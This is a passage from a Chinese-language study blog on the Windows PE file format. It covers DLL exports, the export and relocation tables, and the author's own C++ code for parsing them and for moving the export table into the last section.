y)</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">int</span> _declspec(dllexport) <span class="hljs-function">__stdcall <span class="hljs-title">Sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">int</span> _declspec(dllexport) <span class="hljs-function">__stdcall <span class="hljs-title">Mul</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-keyword">int</span> _declspec(dllexport) <span class="hljs-function">__stdcall  <span class="hljs-title">Div</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;<br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PCH_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PCH_H</span><br><br><span class="hljs-comment">// 添加要在此处预编译的标头</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;framework.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//PCH_H</span></span><br><br></code></pre></td></tr></table></figure><p>把生成的dll，pch.h,framkwork.h,lib拷贝到测试项目里</p><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/222.png" alt="image-20220310194805992" style="zoom: 50%;"><p>测试项目加入</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;Dll1.lib&quot;</span>)</span><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllimport) <span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall  <span class="hljs-title">Plus</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllimport) <span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall  <span class="hljs-title">Sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllimport) <span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall  <span class="hljs-title">Mul</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllimport) <span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall  <span class="hljs-title">Div</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;<br></code></pre></td></tr></table></figure><p>编译即可</p><h2 id="函数无名字导出"><a class="markdownIt-Anchor" href="#函数无名字导出"></a> 函数无名字导出</h2><p>新建立一个模块</p><p><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220316102255477.png" alt="image-20220316102255477"></p><p>输入如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">LIBRARY<br>EXPORTS<br><br>Plus   @<span class="hljs-number">12</span><br>Sub@<span class="hljs-number">15</span> NONAME <span class="hljs-comment">//要不使用名字导出的函数</span><br>Mul    @<span class="hljs-number">13</span><br>Div    @<span class="hljs-number">16</span><br><br></code></pre></td></tr></table></figure><h1 id="导出表"><a class="markdownIt-Anchor" href="#导出表"></a> 导出表</h1><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220308231541901.png" alt="image-20220308231541901" style="zoom: 67%;"><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">   DWORD   NumberOfFunctions; <br>   根据导出函数的序号最大的减最小+<span class="hljs-number">1</span>的得出，所以不一定是真实的个数<br>DWORD   AddressOfFunctions;     <span class="hljs-regexp">//</span>  导出函数地址表RVA<br>有可能是空的-&gt;指这个地方无对应序号的函数<br>DWORD   Base;<br>此数据加上（DWORD   AddressOfNameOrdinals;  <span class="hljs-regexp">//</span> 导出函数序号表RVA）里的序号   才是导出时函数的序号<br><br></code></pre></td></tr></table></figure><h2 id="按名字找函数"><a class="markdownIt-Anchor" href="#按名字找函数"></a> 按名字找函数</h2><p>DWORD   AddressOfNames; -&gt;找到名字，然后根据找到的函数对应的下标-&gt;DWORD   AddressOfNameOrdinals;对应的下标找到序号-&gt;到DWORD   AddressOfFunctions;表里找到对应此下标的函数</p><h2 id="序号查找"><a class="markdownIt-Anchor" href="#序号查找"></a> 序号查找</h2><p>给出的序号减去DWORD   Base;，根据下标到AddressOfNames;寻找地址即可</p><p>给的图例：</p><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220308234327903.png" alt="image-20220308234327903" style="zoom: 67%;"><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220308234515094.png" alt="image-20220308234515094" style="zoom: 67%;"><p><strong>名字表的索引是用来定位序号表的序号：名字表[2]-&gt;序号表[2]-&gt;取出序号</strong></p><p><strong>！！序号对应地址表的索引，如果是无名的函数，序号应该是地址表的下标加base</strong></p><h2 id="写的程序"><a class="markdownIt-Anchor" href="#写的程序"></a> 写的程序</h2><p>我觉得我写的有点乱，看网上是最好根据<strong>函数地址表</strong>来查另外两个表然后定位和输出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showEXPORT_DIRECTORY</span><span class="hljs-params">(LPVOID pFileBuffer)</span> </span>&#123;<br><br>PIMAGE_NT_HEADERS pNtHeaders = <span class="hljs-literal">NULL</span>;<br>PIMAGE_EXPORT_DIRECTORY exportDIRECTORY = <span class="hljs-literal">NULL</span>;<br><br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pFileBuffer);<br>exportDIRECTORY = (PIMAGE_EXPORT_DIRECTORY) pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br>exportDIRECTORY = (PIMAGE_EXPORT_DIRECTORY) <span class="hljs-built_in">RVAtoFOA</span>((DWORD)exportDIRECTORY, pFileBuffer);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******************************\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表文件地址:%x\n&quot;</span>, exportDIRECTORY);<br><br>PIMAGE_EXPORT_DIRECTORY exportDIRECTORYfilebuffer = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)exportDIRECTORY + (DWORD)pFileBuffer);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数个数:%x\n&quot;</span>, exportDIRECTORYfilebuffer-&gt;NumberOfFunctions);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表有名字的函数个数:%x\n&quot;</span>, exportDIRECTORYfilebuffer-&gt;NumberOfNames);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******************************\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数地址表文件地址:%x\n&quot;</span>, <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfFunctions,pFileBuffer));<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; exportDIRECTORYfilebuffer-&gt;NumberOfFunctions; i++) &#123;<br><br>DWORD* tureAddressOfFunctions = (DWORD*)((DWORD)pFileBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfFunctions, pFileBuffer)) + i;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数地址表文件地址%x:%x\n&quot;</span>, i,(DWORD)<span class="hljs-built_in">RVAtoFOA</span>((DWORD)tureAddressOfFunctions- (DWORD)pFileBuffer,pFileBuffer));<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******************************\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数名字表文件地址:%x\n&quot;</span>, <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfNames, pFileBuffer));<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; exportDIRECTORYfilebuffer-&gt;NumberOfNames; i++) &#123;<br>DWORD* tureAddressOfNames = (DWORD*)((DWORD)pFileBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfNames, pFileBuffer))+i;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数名字表文件中地址的值:%x\n&quot;</span>, *tureAddressOfNames);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数名字表文件地址:%x\n&quot;</span>, <span class="hljs-built_in">RVAtoFOA</span>((DWORD)*tureAddressOfNames,pFileBuffer));<br><br>PCHAR Nameaddr = (PCHAR)((BYTE*)<span class="hljs-built_in">RVAtoFOA</span>((DWORD)*tureAddressOfNames, pFileBuffer) + (DWORD)pFileBuffer);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数%x名字:%s\n&quot;</span>,i,Nameaddr );<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******************************\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数序号表base:%x\n&quot;</span>, exportDIRECTORYfilebuffer-&gt;Base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数序号表文件地址:%x\n&quot;</span>, <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfNameOrdinals, pFileBuffer));<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; exportDIRECTORYfilebuffer-&gt;NumberOfNames; i++) &#123;<br>WORD* tureAddressOfxvhao = (WORD*)((DWORD)pFileBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfNameOrdinals, pFileBuffer)) + i;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数序号表序号[%x]的值:%x\n&quot;</span>, i,*tureAddressOfxvhao);<br><br><span class="hljs-comment">///printf(&quot;导出表函数名字表文件地址:%x\n&quot;, RVAtoFOA((DWORD)*tureAddressOfxvhao, pFileBuffer));</span><br><br><span class="hljs-comment">//PWORD idaddr = (PWORD)((BYTE*)RVAtoFOA((DWORD)*tureAddressOfxvhao, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="hljs-comment">//printf(&quot;导出表函数名字表文件地址:%d\n&quot;, idaddr);</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220312164228866.png" alt="image-20220312164228866" style="zoom: 50%;"><h1 id="重定位表"><a class="markdownIt-Anchor" href="#重定位表"></a> 重定位表</h1><p>数据目录的第六个结构，用来定位需要修改的地址位置（程序加载dll的时候，如果dll加载的基址不是imagebase，则根据此表偏移依次修改此表中指向的地址）</p><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220312000406461.png" alt="image-20220312000406461" style="zoom:67%;"><h2 id="内容说明"><a class="markdownIt-Anchor" href="#内容说明"></a> 内容说明</h2><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220312164009483.png" alt="image-20220312164009483" style="zoom: 67%;"><h2 id="自己写的程序解析"><a class="markdownIt-Anchor" href="#自己写的程序解析"></a> 自己写的程序解析</h2><p>写了之后，感觉清楚挺多了，就是还不知道这个表修改的过程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">展示重定位表块的内容</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showRELOCATIONsetion</span><span class="hljs-params">(DWORD numofsetion,WORD* start,DWORD addrbase, LPVOID pFileBuffer)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>;i &lt; numofsetion;i++)<br>&#123;<br>WORD time = *start;<br>DWORD addradd = (time &amp; <span class="hljs-number">0xFFF</span>)+addrbase;<br><br><span class="hljs-keyword">if</span> (((time &amp; <span class="hljs-number">0xF000</span>) &gt;&gt; <span class="hljs-number">12</span>) == <span class="hljs-number">3</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;块需要修改，块高4位%x,后12位%x,RVA的值%x,,FOA值%x\n&quot;</span>, ((time &amp; <span class="hljs-number">0xF000</span>) &gt;&gt; <span class="hljs-number">12</span>),(time &amp; <span class="hljs-number">0xFFF</span>),addradd,<span class="hljs-built_in">RVAtoFOA</span>(addradd,pFileBuffer));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;块不需要修改，块高4位%x,后12位%x,RVA的值%x,FOA值%x\n&quot;</span>, ((time &amp; <span class="hljs-number">0xF000</span>) &gt;&gt; <span class="hljs-number">12</span>), (time &amp; <span class="hljs-number">0xFFF</span>),addradd, <span class="hljs-built_in">RVAtoFOA</span>(addradd, pFileBuffer));<br>&#125;<br><br><br>start = start + <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<span class="hljs-comment">/*</span><br><span class="hljs-comment">展示重定位表，需要文件指针</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showRELOCATION</span><span class="hljs-params">(LPVOID pFileBuffer)</span> </span>&#123;<br>PIMAGE_NT_HEADERS pNtHeaders = <span class="hljs-literal">NULL</span>;<br>PIMAGE_BASE_RELOCATION pRELOCATIONDIRECTORY = <span class="hljs-literal">NULL</span>;<br>PIMAGE_BASE_RELOCATION pnextRELOCATIONDIRECTORY = <span class="hljs-literal">NULL</span>;<br>DWORD lastRELOCATIONDIRECTORYaddr = <span class="hljs-number">1</span>;<br>DWORD lastvirtualaddr = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">int</span> kuai = <span class="hljs-number">0</span>;<br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pFileBuffer);<br><br>pRELOCATIONDIRECTORY = <span class="hljs-built_in">PIMAGE_BASE_RELOCATION</span>(<span class="hljs-built_in">RVAtoFOA</span>(pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">5</span>].VirtualAddress, pFileBuffer)+ (DWORD)pFileBuffer);<br>pnextRELOCATIONDIRECTORY = pRELOCATIONDIRECTORY;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******************************\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;重定位表内容\n&quot;</span>);<br><span class="hljs-comment">//lastvirtualaddr = pRELOCATIONDIRECTORY-&gt;VirtualAddress;</span><br><span class="hljs-keyword">while</span> (lastvirtualaddr &gt; <span class="hljs-number">0</span>) <br>&#123;<br>kuai++;<br>pRELOCATIONDIRECTORY = pnextRELOCATIONDIRECTORY;<br>DWORD numofsetion = (pRELOCATIONDIRECTORY-&gt;SizeOfBlock - <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;块%x的地址是%x,大小是%x,块的数量是%x\n&quot;</span>, kuai,pRELOCATIONDIRECTORY-&gt;VirtualAddress,pRELOCATIONDIRECTORY-&gt;SizeOfBlock,numofsetion);<br><span class="hljs-built_in">showRELOCATIONsetion</span>(numofsetion, (WORD*)((DWORD)pRELOCATIONDIRECTORY + <span class="hljs-number">8</span>), (DWORD)pRELOCATIONDIRECTORY-&gt;VirtualAddress,pFileBuffer);<br><br><br><br>lastRELOCATIONDIRECTORYaddr = (DWORD)pRELOCATIONDIRECTORY+ pRELOCATIONDIRECTORY-&gt;SizeOfBlock;<span class="hljs-comment">//下一个块的地址是文件中的地址加块大小</span><br>pnextRELOCATIONDIRECTORY = (PIMAGE_BASE_RELOCATION)lastRELOCATIONDIRECTORYaddr;<br>lastvirtualaddr = pnextRELOCATIONDIRECTORY-&gt;VirtualAddress;<br><br><br>&#125;<br><span class="hljs-comment">//pRELOCATIONDIRECTORY-&gt;VirtualAddress;</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220312185341428.png" alt="image-20220312185341428" style="zoom:50%;"><p>完全一致，说明应该没问题</p><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220312190100318.png" alt="image-20220312190100318" style="zoom:50%;"><h1 id="重定位表和导出表的迁移"><a class="markdownIt-Anchor" href="#重定位表和导出表的迁移"></a> 重定位表和导出表的迁移</h1><p>步骤其实就是这样</p><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220313203239204.png" alt="image-20220313203239204" style="zoom:67%;"><p>不过程序写的时候比较蛋疼，调了好几次都没成功：</p><p><strong>1.注意rva的转换，主要是注意函数使用的是内存空间，要计算foa就得减去指针开始的地方。</strong></p><p><strong>2.注意rva的计算，因为表里存放的都是rva，反正是在最后一个节之后添加的的节，可以用最后一个节的VirtualAddress 加上文件地址和最后一个节文件地址PointerToRawData的相对偏移。</strong></p><p>这个和肝了我好久</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">导出表和重定位表迁移测试</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">LPVOID <span class="hljs-title">removeDIRECTORY</span><span class="hljs-params">(LPVOID  pFileBuffer)</span> </span>&#123;<br>PIMAGE_NT_HEADERS pNtHeaders = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER pSectionHeaderBase = <span class="hljs-literal">NULL</span>;<br>LPVOID start = <span class="hljs-literal">NULL</span>;<br>PIMAGE_EXPORT_DIRECTORY exportDIRECTORY = <span class="hljs-literal">NULL</span>;<br>pNtHeaders = <span class="hljs-built_in">FileToNtHeader</span>(pFileBuffer);<br>pSectionHeaderBase = <span class="hljs-built_in">LocateSectionBase</span>(pFileBuffer);<br>DWORD addrofnamervafirst = <span class="hljs-number">0</span>;<br><br>exportDIRECTORY = (PIMAGE_EXPORT_DIRECTORY)pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br>exportDIRECTORY = (PIMAGE_EXPORT_DIRECTORY)<span class="hljs-built_in">RVAtoFOA</span>((DWORD)exportDIRECTORY, pFileBuffer);<br><span class="hljs-comment">//导出表现在的文件地址+pfilebuffer</span><br>PIMAGE_EXPORT_DIRECTORY exportDIRECTORYfilebuffer = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)exportDIRECTORY + (DWORD)pFileBuffer);<br><br><br><span class="hljs-comment">//DWORD SizeOfHeadersmem = pSectionHeaderBase-&gt;VirtualAddress;</span><br><span class="hljs-comment">//找最后一个节</span><br>PIMAGE_SECTION_HEADER pLaswSectionHeaderBase = <span class="hljs-built_in">PIMAGE_SECTION_HEADER</span>((BYTE*)pSectionHeaderBase + (DWORD)(<span class="hljs-number">0x28</span> * (pNtHeaders-&gt;FileHeader.NumberOfSections - <span class="hljs-number">1</span>)));<br><span class="hljs-comment">//找最后一个节的开始地址</span><br>start = (LPVOID)(pLaswSectionHeaderBase-&gt;PointerToRawData + (DWORD)pFileBuffer);<br>LPVOID starttest = (LPVOID)(pLaswSectionHeaderBase-&gt;PointerToRawData + (DWORD)pFileBuffer);<span class="hljs-comment">//记录内存空间中复制开始的地址</span><br><br><span class="hljs-comment">//复制AddressOfFunctions </span><br>DWORD AddressOfFunctionssize = exportDIRECTORYfilebuffer-&gt;NumberOfFunctions * <span class="hljs-number">4</span>;<span class="hljs-comment">//大小</span><br><span class="hljs-comment">//计算rva</span><br>DWORD AddressOfFunctionsrva = (DWORD)pLaswSectionHeaderBase-&gt;VirtualAddress + (DWORD)start - (DWORD)starttest;<br><span class="hljs-comment">//AddressOfFunctions 起始文件地址</span><br>DWORD* tureAddressOfFunctions = (DWORD*)((DWORD)pFileBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfFunctions, pFileBuffer));<br><span class="hljs-built_in">memcpy</span>(start, tureAddressOfFunctions, AddressOfFunctionssize);<br><br><span class="hljs-comment">//三步：复制AddressOfNameOrdinals</span><br>start = (LPVOID)((DWORD)start + AddressOfFunctionssize);<br>DWORD AddressOfNameOrdinalsrva = (DWORD)pLaswSectionHeaderBase-&gt;VirtualAddress + (DWORD)start - (DWORD)starttest;<br>DWORD AddressOfNameOrdinalssize = exportDIRECTORYfilebuffer-&gt;NumberOfNames * <span class="hljs-number">2</span>;<br><span class="hljs-comment">//AddressOfNameOrdinals的起始文件地址</span><br>WORD* tureAddressOfNameOrdinals = (WORD*)((DWORD)pFileBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfNameOrdinals, pFileBuffer));<br><span class="hljs-built_in">memcpy</span>(start, tureAddressOfNameOrdinals, AddressOfNameOrdinalssize);<br><br><span class="hljs-comment">//四步：复制AddressOfNames</span><br>start = (LPVOID)((DWORD)start + AddressOfNameOrdinalssize);<br>DWORD AddressOfNamesrva = (DWORD)pLaswSectionHeaderBase-&gt;VirtualAddress + (DWORD)start - (DWORD)starttest;<br>LPVOID namneaddrstart = start;<span class="hljs-comment">//记录一下拷贝的名字表的起始地址</span><br>DWORD AddressOfNamessize = exportDIRECTORYfilebuffer-&gt;NumberOfNames * <span class="hljs-number">4</span>;<br><span class="hljs-comment">//AddressOfNames的起始文件地址</span><br>DWORD* tureAddressOfNames = (DWORD*)((DWORD)pFileBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfNames, pFileBuffer));<br><span class="hljs-built_in">memcpy</span>(start, tureAddressOfNames, AddressOfNamessize);<br><br><br><span class="hljs-comment">//复制所有的函数名字</span><br>start = (LPVOID)((DWORD)start + AddressOfNamessize);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******************************拷贝名字表的名字\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; exportDIRECTORYfilebuffer-&gt;NumberOfNames; i++) &#123;<br>DWORD* tureAddressOfNames = (DWORD*)((DWORD)pFileBuffer + <span class="hljs-built_in">RVAtoFOA</span>(exportDIRECTORYfilebuffer-&gt;AddressOfNames, pFileBuffer)) + i;<br>DWORD* tureAddressOfNames2 = (DWORD*)((DWORD)namneaddrstart) + i;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;导出表函数名字表文件中地址的值:%x，拷贝后的表里地址的值%x\n&quot;</span>, *tureAddressOfNames, *tureAddressOfNames2);<br><br><span class="hljs-built_in">printf</span>(<span 